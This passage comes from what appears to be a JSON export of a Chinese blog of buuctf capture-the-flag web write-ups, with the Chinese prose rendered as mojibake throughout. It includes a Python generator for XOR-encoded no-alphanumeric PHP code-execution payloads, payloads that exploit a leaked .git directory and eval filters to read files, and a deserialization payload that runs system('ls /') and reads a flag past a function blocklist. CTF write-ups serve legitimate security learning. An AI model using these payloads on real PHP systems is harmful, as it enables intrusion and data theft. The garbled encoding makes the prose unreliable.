ä¸ºç‚¹å·åœ¨phpå†…æ˜¯éæ³•å‘½åç¬¦ï¼Œä¼šè¢«è½¬åŒ–ä¸ºä¸‹åˆ’çº¿\n\nå®˜æ–¹æ–‡æ¡£ä¸­æœ‰æåˆ°ï¼šhttps://www.php.net/manual/zh/language.variables.external.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927257277-ddeecad1-21b1-4a85-be39-e28b4bd87882.png)\n\né‚£ä¹ˆè¯¥æ€ä¹ˆç»•è¿‡å‘¢ è¿™é‡Œå‚è€ƒï¼šhttps://xz.aliyun.com/t/11512\n\næ„é€ payload: `NS[CTF.go=1`å°±èƒ½ç»•è¿‡ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927514308-229d457c-463c-44b8-ab89-bda1cb695b70.png)\n\nè¿™é‡Œä¼šæŠŠç¬¬ä¸€ä¸ª`[`å…ˆè½¬åŒ–ä¸ºä¸‹åˆ’çº¿ç„¶åç¬¬äºŒä¸ªç‚¹å°±ä¸ä¼šè¢«è½¬åŒ–äº†\n\nè¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯phpè§£ææ—¶æŠŠç¬¬ä¸€ä¸ª`[`å½“ä½œäº†æ•°ç»„çš„æ ‡å¿—ä½†ä¸åˆæ³•å°±ç»™è½¬åŒ–äº† ç„¶åä»¥ä¸ºç‚¹æ˜¯æ•°ç»„é‡Œçš„å…ƒç´ åä»è€Œæ²¡æœ‰è½¬åŒ–ä¸ºä¸‹åˆ’çº¿\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927469133-3fe86fe3-7032-474b-9f2b-458df0d365ef.png)\n\nè¿™ä¸ªbugåªæœ‰å½“phpç‰ˆæœ¬å°äº8æ—¶æ‰ä¼šæœ‰ï¼šå‚è€ƒï¼šhttps://blog.csdn.net/mochu7777777/article/details/115050295\n\nphp8ç‰ˆæœ¬ä¿®å¤äº†è¿™ä¸ªbugï¼Œå¦‚å›¾\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679979254109-272268cf-7aef-41f0-af9c-6a23471c0c42.png)\n\n\n\n## æ— æ•°å­—å­—æ¯rce\n\nè¿™é‡Œç”¨åˆ°äº†å¼‚æˆ–ç»•è¿‡ï¼Œç›´æ¥è„šæœ¬ç”Ÿæˆï¼ŒçœŸçš„å¾ˆæ–¹ä¾¿ æ”¾å¤§ä½¬çš„ç†è§£ï¼šhttps://xz.aliyun.com/t/11929#toc-4 \n\næ€»ç»“çš„éå¸¸å¥½é€å½»ï¼Œæˆ‘å°±ä¸åœ¨è¿™é‡Œå¤šè¨€äº†qwq\n\næ”¾ä¸€ä¸‹æ„é€ è„šæœ¬æŠŠï¼š\n\n```python\nimport re\nimport requests\nimport urllib\nfrom sys import *\nimport os\n\n\na=[]\nans1=\"\" \nans2=\"\"\nfor i in range(0,256): #è®¾ç½®içš„èŒƒå›´\n    c=chr(i)\n    #å°†iè½¬æ¢æˆasciiå¯¹åº”çš„å­—ç¬¦ï¼Œå¹¶èµ‹å€¼ç»™c\n    tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-',c,re.I)\n    #è®¾ç½®è¿‡æ»¤æ¡ä»¶ï¼Œè®©å˜é‡cåœ¨å…¶ä¸­æ‰¾å¯¹åº”ï¼Œå¹¶åˆ©ç”¨ä¿®é¥°ç¬¦è¿‡æ»¤å¤§å°å†™ï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°æœªè¢«è¿‡æ»¤çš„å­—ç¬¦\n    if(tmp):\n        continue\n        #å½“æ‰§è¡Œæ­£ç¡®æ—¶ï¼Œé‚£è¯´æ˜è¿™äº›æ˜¯è¢«è¿‡æ»¤æ‰çš„ï¼Œæ‰€ä»¥æ‰ä¼šè¢«åŒ¹é…åˆ°ï¼Œæ­¤æ—¶æˆ‘ä»¬è®©ä»–ç»§ç»­æ‰§è¡Œå³å¯\n    else:\n        a.append(i)\n        #åœ¨æ•°ç»„ä¸­å¢åŠ iï¼Œè¿™äº›å°±æ˜¯æœªè¢«ç³»ç»Ÿè¿‡æ»¤æ‰çš„å­—ç¬¦\n\n\n# eval(\"echo($c);\");\nmya=\"system\"  #å‡½æ•°å è¿™é‡Œä¿®æ”¹ï¼\nmyb=\"dir\"      #å‚æ•°\ndef myfun(k,my): #è‡ªå®šä¹‰å‡½æ•°\n    global ans1 #å¼•ç”¨å…¨å±€å˜é‡ans1ï¼Œä½¿å¾—åœ¨å±€éƒ¨å¯¹å…¶è¿›è¡Œæ›´æ”¹æ—¶ä¸ä¼šæŠ¥é”™\n    global ans2 #å¼•ç”¨å…¨å±€å˜é‡ans2ï¼Œä½¿å¾—åœ¨å±€éƒ¨å¯¹å…¶è¿›è¡Œæ›´æ”¹æ—¶ä¸ä¼šæŠ¥é”™\n    for i in range (0,len(a)): #è®¾ç½®å¾ªç¯èŒƒå›´ä¸ºï¼ˆ0ï¼Œaï¼‰æ³¨ï¼šaä¸ºæœªè¢«è¿‡æ»¤çš„å­—ç¬¦æ•°é‡ \n        for j in range(i,len(a)): #åœ¨ä¸Šä¸ªå¾ªç¯çš„æ¡ä»¶ä¸‹è®¾ç½®jçš„èŒƒå›´\n            if(a[i]^a[j]==ord(my[k])):\n                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])\n                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])\n                return;#è¿”å›å¾ªç¯è¯­å¥ä¸­ï¼Œé‡æ–°å¯»æ‰¾ç¬¬äºŒä¸ªkï¼Œè¿™é‡Œçš„è¯å°±æ˜¯å¯»æ‰¾yå¯¹åº”çš„ä¸¤ä¸ªå­—ç¬¦\nfor x in range(0,len(mya)): #è®¾ç½®kçš„èŒƒå›´\n    myfun(x,mya)#å¼•ç”¨è‡ªå®šä¹‰çš„å‡½æ•°\ndata1=\"('\"+urllib.request.quote(ans1)+\"'^'\"+urllib.request.quote(ans2)+\"')\" #data1ç­‰äºä¼ å…¥çš„å‘½ä»¤,\"+ans1+\"æ˜¯å›ºå®šæ ¼å¼ï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°å˜é‡å¯¹åº”çš„å€¼ï¼Œå†ç”¨'åŒ…è£¹ï¼Œè¿™æ ·æ˜¯å˜é‡çš„å›ºå®šæ ¼å¼ï¼Œå¦ä¸€ä¸ªä¹Ÿæ˜¯å¦‚æ­¤ï¼Œä¸¤ä¸ªåœ¨è¿›è¡ŒURLç¼–ç åè¿›è¡ŒæŒ‰ä½ä¸è¿ç®—ï¼Œç„¶åå¾—åˆ°å¯¹åº”å€¼\nprint(data1)\nans1=\"\"#å¯¹ans1è¿›è¡Œé‡æ–°èµ‹å€¼\nans2=\"\"#å¯¹ans2è¿›è¡Œé‡æ–°èµ‹å€¼\nfor k in range(0,len(myb)):#è®¾ç½®kçš„èŒƒå›´ä¸º(0,len(myb))\n    myfun(k,myb)#å†æ¬¡å¼•ç”¨è‡ªå®šä¹‰å‡½æ•°\ndata2=\"(\\\"\"+urllib.request.quote(ans1)+\"\\\"^\\\"\"+urllib.request.quote(ans2)+\"\\\")\"\nprint(data2)\n```\n","tags":["RCEå¥‡æ·«æ–¹å¼","PHPååºåˆ—åŒ–","linuxé€šé…ç¬¦","getshell","md5 sha1å¼ºç›¸ç­‰"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf 38-[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ","url":"/post/2ed7a105.html","content":"\nbuuctf 38-[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337192.png)\n\n\n\nå¼€å±€ä¸€å¼ å›¾ï¼Œbuuç½‘ç«™æ‰«ç½‘ç«™æœ‰æ—¶å€™å‡ºä¸æ¥ï¼Œçœ‹äº†åˆ«äººçš„wpæ˜¯gitæºç æ³„éœ²äº† å‚è€ƒå¤§ä½¬çš„æ–‡ç« ï¼šhttps://www.freebuf.com/articles/web/346607.html \n\nå¯ä»¥æ‹¿configæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹\n\næ„é€ payloadï¼š`http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git.config` \n\n â€¢ **configï¼š**æ–‡ä»¶åŒ…å«é¡¹ç›®ç‰¹æœ‰çš„é…ç½®é€‰é¡¹ï¼Œgit configå‘½ä»¤ä¼šæ”¹åŠ¨å®ƒï¼›  \n\nå‘ç°æœ‰æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ è¯´æ˜æ˜¯githubæºç æ³„éœ²\n\nä¸‹å¥½è„šæœ¬ æ„é€ payloadï¼š`python2 GitHack.py http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git` æ³¨æ„æœ«å°¾åŠ ä¸Š `.git` ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337237.png)\n\næŸ¥çœ‹index.php \n\n```php\n<?php\ninclude \"flag.php\";\necho \"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"è¿˜å·®ä¸€ç‚¹å“¦ï¼\");\n            }\n        }\n        else{\n            die(\"å†å¥½å¥½æƒ³æƒ³ï¼\");\n        }\n    }\n    else{\n        die(\"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n```\n\nä¸»è¦æ˜¯è¿‡æ»¤äº†ä¸€äº›ä¼ªåè®®å’Œä¸€äº›`â€œetâ€â€œnaâ€â€œinfoâ€â€œdecâ€â€œbinâ€â€œhexâ€â€œoctâ€â€œpiâ€â€œlogâ€`å­—ç¬¦\n\næœ€é‡è¦çš„æ˜¯ä¸­é—´ä¸€å±‚ æœ‰æˆ‘ä¸çŸ¥é“çš„æ­£åˆ™è¡¨è¾¾å¼çš„çŸ¥è¯†ç‚¹ å‚è€ƒï¼šhttps://blog.csdn.net/Manuffer/article/details/120738755\n\n```\nif(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp']))\n```\n\nè¿™é‡Œ`(?R)`ä»£è¡¨å½“å‰è¡¨è¾¾å¼ ,å°±æ˜¯è¿™ä¸ª`(/[a-z,_]+((?R)?)/)`ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡ï¼ˆè‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…`a(b(c(d())))` æ³¨æ„è¿™é‡ŒåŠ å·ä¸æ˜¯æŠŠå‰åè¿æ¥èµ·æ¥ +ï¼šåŠ å·åœ¨æ­£åˆ™è¡¨è¾¾å¼æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œç­‰åŒäºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡\n\nå½“`;`ç­‰äºåé¢åŒ¹é…å®Œä»¥åå‰©ä½™çš„`;`æ¡ä»¶æˆç«‹  å¯ä»¥æ ¹æ®è¿™ä¸ªæ€è·¯æ„é€ å‘½ä»¤æ‰§è¡Œ\n\n### æ–¹æ³•ä¸€ï¼š\n\nlocaleconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚\n\n(PHP 4, PHP 5, PHP 7, PHP 8)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337225.png)\n\nè¿”å›ä¸€ä¸ªæ•°ç»„ ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º`.` æ„é€ payloadçš„æ—¶å€™å¯ä»¥ç”¨çš„ `.` å’Œ `./` æ„æ€ç›¸åŒéƒ½æ˜¯å½“å‰ç›®å½• `../`æ˜¯ä¸Šçº§ç›®å½• \n\ncurrent() â€” è¿”å›æ•°ç»„ä¸­çš„å½“å‰å€¼\n\nè¯´æ˜:\n\ncurrent(array|object $array): mixed\n\næ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒâ€œå½“å‰çš„â€å•å…ƒï¼Œåˆå§‹åŒ–æ—¶ä¼šæŒ‡å‘è¯¥æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå€¼ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337217.png)\n\næ„é€ `?exp=print_r(scandir(current(localeconv())));`\n\næ‰€ä»¥è¿™ä¸ªç»„åˆscandir(current(localeconv()))å¾ˆå¸¸ç”¨ï¼Œå¯ä»¥è®°ä¸€ä¸‹ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337258.png)\n\nå‘ç°flagæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ€ä¹ˆè¯»äº†ï¼Œå› ä¸ºç°åœ¨æŒ‡é’ˆæŒ‡åœ¨ç¬¬ä¸€ä¸ªå…ƒç´ ä¸Š æŠŠæ•°ç»„åè½¬è¿‡æ¥è®©flagæ–‡ä»¶åœ¨æ­£æ•°ç¬¬äºŒ å†é€šè¿‡next()æŒ‡å‘ç¬¬äºŒä¸ªå…ƒç´ è¯»å–flag\n\narray_reverse() â€” è¿”å›å•å…ƒé¡ºåºç›¸åçš„æ•°ç»„\n\nnext() â€” å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½\n\nshow_source â€” åˆ«å highlight_file() ç”¨å“ªä¸ªéƒ½è¡Œ\n\næ„é€ payload:`?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337248.png)\n\n### æ–¹æ³•äºŒï¼š\n\né€šè¿‡ä¿®æ”¹phpsessionå³ä¼šè¯çŠ¶æ€ ç„¶åpayloadè¯»å‡ºæ¥å³å¯ å‚è€ƒè¿˜æ˜¯ä¸Šé¢çš„æ–‡ç«  https://blog.csdn.net/Manuffer/article/details/120738755\n\nsession_id()å¯ä»¥ç”¨æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ ID,å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„`phpsessionid`äº†ï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚\n\nä½†session_idå¿…é¡»è¦å¼€å¯sessionæ‰å¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆä½¿ç”¨session_startã€‚\n\næ„é€ payload:`?exp=show_source(session_id(session_start()));`\n\nbpæŠ“åŒ…ä¿®æ”¹`session_id=flag.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337617.png)\n","tags":["æºç æ³„éœ²","GitHack","(?R)","åµŒå¥—æ„é€ ","PHPSESSION"]},{"title":"buuctf 37-[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb","url":"/post/6d6051d0.html","content":"\nbuuctf [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340646.png)\n\nå‘ç°å¯ä»¥ç›´æ¥è·å–æˆ‘ä»¬çš„æ—¶é—´ï¼Œå¹¶ä¸”æ¯äº”åˆ†é’Ÿåˆ·æ–°æ›´æ–°ä¸€æ¬¡ï¼Œå¤§è‡´æ„æ€å°±æ˜¯åˆ©ç”¨ç³»ç»Ÿæ—¶åŒºè®¾ç½®ï¼Œæœ€é‡è¦çš„æ˜¯åº”è¯¥æ˜¯è¿™ä¸ªç½‘é¡µé€šè¿‡php é‡Œçš„data()å‡½æ•°æ¥è·å–å½“å‰æˆ‘ä»¬çš„æ—¶é—´ï¼Œå¹¶ä¸”åœ¨ç½‘é¡µæºä»£ç ä¸­ä¹Ÿæ ‡å‡ºæ¥äº†ï¼Œåº”è¯¥ç®—æ˜¯æç¤ºã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340325.png)\n\nå¹¶ä¸”å‘ç° é€šè¿‡postæ–¹å¼ ç»™`$func`ä¼ å€¼ä¸º `data`    `$p` ä¼ å€¼ä¸º`Y-m-d h:i:s a` data()å‡½æ•°æ ¼å¼åŒ–æ—¶é—´ç”¨çš„\n\næ‰€ä»¥å°±å¯ä»¥ ç”¨system() å‡½æ•°å‘½ä»¤æ‰§è¡Œäº† ä½†æ˜¯è‚¯å®šä¸è¡Œ è¢«æ²³èŸ¹äº† \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340430.png)\n\nå‘ç°éšä¾¿è¾“å…¥æ—¶ ä¼šçˆ†å‡ºcall_user_func()å‡½æ•° è¿™ä¸ªå‡½æ•°ç®€å•æ¥è¯´å°±æ˜¯ç”¨ç¬¬ä¸€ä¸ªè¾“å…¥å€¼ä½œä¸ºå›è°ƒå‡½æ•° ç¬¬äºŒä¸ªè¾“å…¥ä¸ºç¬¬ä¸€ä¸ªå›è°ƒå‡½æ•°çš„å‚æ•° \n\nç›´æ¥ä½¿ç”¨file_get_contents() æœ¬æ¥æƒ³ç›´æ¥çˆ†å‡ºflagæ–‡ä»¶çš„å†…å®¹ ä½†æ˜¯å‘½åè¢«æ”¹ä¸ºåˆ«çš„å½¢å¼äº† å‘¢å°±çˆ†ä¸€ä¸‹index.phpçœ‹ä¸€ä¸‹é»‘åå•\n\n```plain\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n\n\nçœ‹åˆ°ç±»å°±æƒ³åˆ°ååºåˆ—åŒ–æ¼æ´ å°†ç±»ä¸­çš„å±æ€§å€¼æ”¹ä¸ºæˆ‘ä»¬å¯ä»¥æ¶æ„æ“ä½œçš„å€¼ ç„¶åç»™`$func`ä¼ ååºåˆ—åŒ–å‡½æ•°ï¼Œç»™`p`ä¼ æˆ‘ä»¬çš„åºåˆ—åŒ–ç»“æœã€‚\n\næ€è·¯å°±æ˜¯ç›´æ¥ååºåˆ—åŒ–å°†åŸæœ¬postå€¼ä¿®æ”¹ ä¸é€šè¿‡é»‘åå•ç­›é€‰\n\næœ¬åœ°æ„é€ ï¼š\n\n```php\n<?php\n    class Test {\n        var $p = \"ls /\";\n        var $func = \"system\";}\n$a = new Test;\necho serialize($a);\n?>\n```\n\næ„é€ payloadï¼š`func=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:4:\"ls /\";s:4:\"func\";s:6:\"system\";}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340578.png)\n\nå‘ç°å¹¶æ²¡æœ‰flagæ–‡ä»¶ æ‰€ä»¥åªèƒ½é€šè¿‡findæŒ‡ä»¤å¯»æ‰¾äº† è¿™é‡Œçœç•¥ æˆ‘è¿™é‡Œfindæ‰¾ä¸å‡ºæ¥æ²¡æœ‰å›å“ ç¯å¢ƒæœ‰é—®é¢˜\n\næœ€åæ„é€ payloadï¼š`func=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"cat /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340505.png)\n","tags":["æ–‡ä»¶åŒ…å«","ååºåˆ—åŒ–","ä»£ç å®¡è®¡"],"categories":["buuctf"]},{"title":"buuctf 36-[BUUCTF 2018]Online Tool","url":"/post/9efd4054.html","content":"\nbuuctf [BUUCTF 2018]Online Tool\n\n<!--more-->\n\næºç é™„ä¸Š\n\n```php\n<?php\n\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n\nif(!isset($_GET['host'])) {\n    highlight_file(__FILE__);\n} else {\n    $host = $_GET['host'];\n    $host = escapeshellarg($host);\n    $host = escapeshellcmd($host);\n    $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']);\n    echo 'you are in sandbox '.$sandbox;\n    @mkdir($sandbox);\n    chdir($sandbox);\n    echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);\n}\n```\n\næœ‰è®¸å¤šä¸æ¸…æ¥šçš„çŸ¥è¯†ï¼Œä¸€ä¸ªä¸€ä¸ªæ¥çœ‹\n\n$_SERVER\n\n$_SERVER æ˜¯PHPé¢„å®šä¹‰çš„è¶…å…¨å±€å˜é‡ã€‚æ‰€è°“â€œè¶…å…¨å±€å˜é‡â€ï¼Œå³åœ¨è„šæœ¬å…¨éƒ¨ä½œç”¨åŸŸä¸­éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä¿å­˜å…³äºæŠ¥å¤´ã€è·¯å¾„å’Œè„šæœ¬ä½ç½®çš„ä¿¡æ¯ã€‚\n\n$_SERVERè¯¦è§£\n$_SERVER[â€˜HTTP_ACCEPT_LANGUAGEâ€™]//æµè§ˆå™¨è¯­è¨€\n$_SERVER[â€˜REMOTE_ADDRâ€™] //å½“å‰ç”¨æˆ· IP ã€‚\n$_SERVER[â€˜REMOTE_HOSTâ€™] //å½“å‰ç”¨æˆ·ä¸»æœºå\n$_SERVER[â€˜REQUEST_URIâ€™] //URL\n$_SERVER[â€˜REMOTE_PORTâ€™] //ç«¯å£ã€‚\n$_SERVER[â€˜SERVER_NAMEâ€™] //æœåŠ¡å™¨ä¸»æœºçš„åç§°ã€‚\n$_SERVER[â€˜PHP_SELFâ€™]//æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å\n$_SERVER[â€˜argvâ€™] //ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°ã€‚\n$_SERVER[â€˜argcâ€™] //ä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°ã€‚\n$_SERVER[â€˜GATEWAY_INTERFACEâ€™]//CGI è§„èŒƒçš„ç‰ˆæœ¬ã€‚\n$_SERVER[â€˜SERVER_SOFTWAREâ€™] //æœåŠ¡å™¨æ ‡è¯†çš„å­—ä¸²\n$_SERVER[â€˜SERVER_PROTOCOLâ€™] //è¯·æ±‚é¡µé¢æ—¶é€šä¿¡åè®®çš„åç§°å’Œç‰ˆæœ¬\n$_SERVER[â€˜REQUEST_METHODâ€™]//è®¿é—®é¡µé¢æ—¶çš„è¯·æ±‚æ–¹æ³•\n$_SERVER[â€˜QUERY_STRINGâ€™] //æŸ¥è¯¢(query)çš„å­—ç¬¦ä¸²ã€‚\n$_SERVER[â€˜DOCUMENT_ROOTâ€™] //å½“å‰è¿è¡Œè„šæœ¬æ‰€åœ¨çš„æ–‡æ¡£æ ¹ç›®å½•\n$_SERVER[â€˜HTTP_ACCEPTâ€™] //å½“å‰è¯·æ±‚çš„ Accept: å¤´éƒ¨çš„å†…å®¹ã€‚\n$_SERVER[â€˜HTTP_ACCEPT_CHARSETâ€™] //å½“å‰è¯·æ±‚çš„ Accept-Charset: å¤´éƒ¨çš„å†…å®¹ã€‚\n$_SERVER[â€˜HTTP_ACCEPT_ENCODINGâ€™] //å½“å‰è¯·æ±‚çš„ Accept-Encoding: å¤´éƒ¨çš„å†…å®¹\n$_SERVER[â€˜HTTP_CONNECTIONâ€™] //å½“å‰è¯·æ±‚çš„ Connection: å¤´éƒ¨çš„å†…å®¹ã€‚ä¾‹å¦‚ï¼šâ€œKeep-Aliveâ€ã€‚\n$_SERVER[â€˜HTTP_HOSTâ€™] //å½“å‰è¯·æ±‚çš„ Host: å¤´éƒ¨çš„å†…å®¹ã€‚\n$_SERVER[â€˜HTTP_REFERERâ€™] //é“¾æ¥åˆ°å½“å‰é¡µé¢çš„å‰ä¸€é¡µé¢çš„ URL åœ°å€ã€‚\n$_SERVER[â€˜HTTP_USER_AGENTâ€™] //å½“å‰è¯·æ±‚çš„ User_Agent: å¤´éƒ¨çš„å†…å®¹ã€‚\n$_SERVER[â€˜HTTPSâ€™]//å¦‚æœé€šè¿‡httpsè®¿é—®,åˆ™è¢«è®¾ä¸ºä¸€ä¸ªéç©ºçš„å€¼(on)ï¼Œå¦åˆ™è¿”å›off\n$_SERVER[â€˜SCRIPT_FILENAMEâ€™] #å½“å‰æ‰§è¡Œè„šæœ¬çš„ç»å¯¹è·¯å¾„åã€‚\n$_SERVER[â€˜SERVER_ADMINâ€™] #ç®¡ç†å‘˜ä¿¡æ¯\n$_SERVER[â€˜SERVER_PORTâ€™] #æœåŠ¡å™¨æ‰€ä½¿ç”¨çš„ç«¯å£\n$_SERVER[â€˜SERVER_SIGNATUREâ€™] #åŒ…å«æœåŠ¡å™¨ç‰ˆæœ¬å’Œè™šæ‹Ÿä¸»æœºåçš„å­—ç¬¦ä¸²ã€‚\n$_SERVER[â€˜PATH_TRANSLATEDâ€™] #å½“å‰è„šæœ¬æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿï¼ˆä¸æ˜¯æ–‡æ¡£æ ¹ç›®å½•ï¼‰çš„åŸºæœ¬è·¯å¾„ã€‚\n$_SERVER[â€˜SCRIPT_NAMEâ€™] #åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„ã€‚è¿™åœ¨é¡µé¢éœ€è¦æŒ‡å‘è‡ªå·±æ—¶éå¸¸æœ‰ç”¨ã€‚\n$_SERVER[â€˜PHP_AUTH_USERâ€™] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åã€‚\n$_SERVER[â€˜PHP_AUTH_PWâ€™] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯ç”¨æˆ·è¾“å…¥çš„å¯†ç ã€‚\n$_SERVER[â€˜AUTH_TYPEâ€™] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯è®¤è¯çš„ç±»å‹\n\nç¬¬ä¸€éƒ¨åˆ†\n\nX-Forwarded-Forï¼ˆXFFï¼‰æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µ\n\n```php\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n```\n\nè·å–æœ¬æœºçš„ip\n\nç¬¬äºŒéƒ¨åˆ†ï¼š\n\næœ‰ä¸¤ä¸ªå¾ˆé‡è¦çš„å‡½æ•°\n\n**escapeshellargä¼šé¦–å…ˆåœ¨å•å¼•å·å‰åŠ 